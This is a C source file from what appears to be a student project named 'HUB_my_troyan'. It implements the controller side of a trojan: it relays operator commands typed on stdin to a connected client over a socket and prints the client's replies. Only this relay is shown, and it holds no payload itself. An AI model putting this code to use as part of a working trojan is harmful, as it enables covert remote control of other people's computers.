/*
** EPITECH PROJECT, 2021
** HUB_my_troyan
** File description:
** 29/04/2021 process_request.c
*/

#include "troyan_server.h"

static int read_client_response(server_t *server)
{
    char buffer[1024];
    ssize_t len = 0;

    while ((len = recv(server->client.fd, buffer, sizeof(buffer) - 1, MSG_DONTWAIT)) > 0) {
        buffer[len] = '\0';
        printf("%s", buffer);
    }
    fflush(NULL);
    return EXIT_SUCCESS;
}

static int process_command(server_t *server)
{
    char *line = NULL;
    size_t size = 0;

    ssize_t nb = getline(&line, &size, stdin);
    if (line) {
        if (nb > 0) {
            socket_send(&server->client, line);
            if (is_command(line, LOGOUT_CMD)) {
                client_disconnect(server);
            }
        }
        free(line);
    }
    return EXIT_FAILURE;
}

int app_process_request(server_t *server)
{
    if (server->client_connected
        && FD_ISSET(STDIN_FILENO, &server->select.read_fds)) {
        process_command(server);
    }
    if (server->client_connected
        && FD_ISSET(server->client.fd, &server->select.read_fds)) {
        read_client_response(server);
    }
    if (FD_ISSET(server->sock.fd, &server->select.read_fds)) {
        if (client_connect(server) == EXIT_FAILURE)
            return EXIT_FAILURE;
    }
    return EXIT_SUCCESS;
}
